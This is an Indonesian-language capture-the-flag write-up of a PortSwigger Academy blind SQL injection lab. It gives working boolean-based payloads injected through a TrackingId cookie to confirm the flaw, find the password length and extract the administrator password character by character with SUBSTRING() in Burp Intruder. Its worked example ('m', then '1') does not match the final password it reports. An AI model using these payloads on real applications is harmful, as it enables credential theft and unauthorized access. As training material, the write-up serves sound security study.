# [PortSwigger Academy] SQL Injection - Lab #11

## 📌 Detail Lab
* **Nama Tantangan:** Blind SQL injection with conditional responses
* **Tingkat Kesulitan:** PRACTITIONER
* **Kategori:** SQL Injection (SQLi) - Blind
* **Tujuan Lab:** Mengekstrak password teks murni untuk user `administrator` dari tabel `users` pada database yang rentan terhadap Blind SQLi, lalu login ke sistem.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Aplikasi menggunakan *cookie* pelacakan bernama `TrackingId` untuk melakukan kueri ke database. Respons aplikasi bersifat kondisional:
* Jika kueri menghasilkan data (TRUE), teks **"Welcome back!"** akan muncul di halaman.
* Jika kueri tidak menghasilkan data (FALSE), teks tersebut akan hilang.

### Perkiraan Kueri SQL Asli Backend:
```sql
SELECT TrackingId FROM tracking WHERE TrackingId = 'G46zfqQCFRHwIFHu'
```
Karena input pada cookie tidak disanitasi, kita bisa menyisipkan sub-kueri logika untuk menguji kebenaran data di dalam database secara bertahap (karakter demi karakter).

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

### Memverifikasi Celah Blind SQLi
Uji respons aplikasi dengan menyuntikkan kondisi logika TRUE dan FALSE pada TrackingId melalui Burp Repeater:

* **Kondisi TRUE:** `TrackingId=G46zfqQCFRHwIFHu' AND '1'='1 -> Respons: Teks "Welcome back!" muncul.`
* **Kondisi FALSE:** `TrackingId=G46zfqQCFRHwIFHu' AND '1'='2 -> Respons: Teks "Welcome back!" hilang.`

Ini mengonfirmasi bahwa parameter TrackingId rentan terhadap Boolean-Based Blind SQLi.

### Memverifikasi Keberadaan User 'administrator'
Pastikan user target ada di dalam tabel users:

* **Payload:** `TrackingId=G46zfqQCFRHwIFHu' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
* **Respons:** ` Teks "Welcome back!" muncul (User administrator valid).`

### Menentukan Panjang Password

* **Payload:** `TrackingId=G46zfqQCFRHwIFHu' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')='20`
* **Respons:** `Teks "Welcome back!" muncul pada angka 20. Ini membuktikan panjang password adalah 20 karakter.`

### Menguras Password Karakter demi Karakter (Data Brute-Forcing)
Untuk mengambil password utuh, kita harus menebak tiap posisi karakter menggunakan fungsi SUBSTRING().

Kirim request ke Burp Intruder dan atur posisi payload posisi karakter:

* **Payload Inti:** `TrackingId=G46zfqQCFRHwIFHu' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§`

Contoh Alur Logika Manual/Intruder:

    Menebak Huruf Ke-1:

        ...SUBSTRING(password,1,1)='a'-- -> "Welcome back!" tidak muncul (Salah).

        ...SUBSTRING(password,1,1)='m'-- -> "Welcome back!" muncul (Benar! Huruf pertama adalah m).

    Menebak Huruf Ke-2:

        ...SUBSTRING(password,2,1)='a'-- -> "Welcome back!" tidak muncul (Salah).

        ...SUBSTRING(password,2,1)='1'-- -> "Welcome back!" muncul (Benar! Huruf kedua adalah 1).

Proses ini diotomatisasi menggunakan Burp Intruder tipe serangan Cluster Bomb untuk menguji posisi 1-20 terhadap seluruh karakter alfanumerik (a-z, 0-9). Urutkan hasil berdasarkan panjang respons (Length) atau cari respons yang memicu teks "Welcome back!".

### Hasil Eksploitasi
Setelah seluruh 20 karakter berhasil ditebak oleh Burp Intruder, didapatkan string password lengkap:
```
pyc2r1aiv4zs98gi4dex
```
Hasil Akhir: Masuk ke halaman login aplikasi, masukkan username administrator beserta password hasil brute-force tadi. Login sukses dan lab dinyatakan Solved.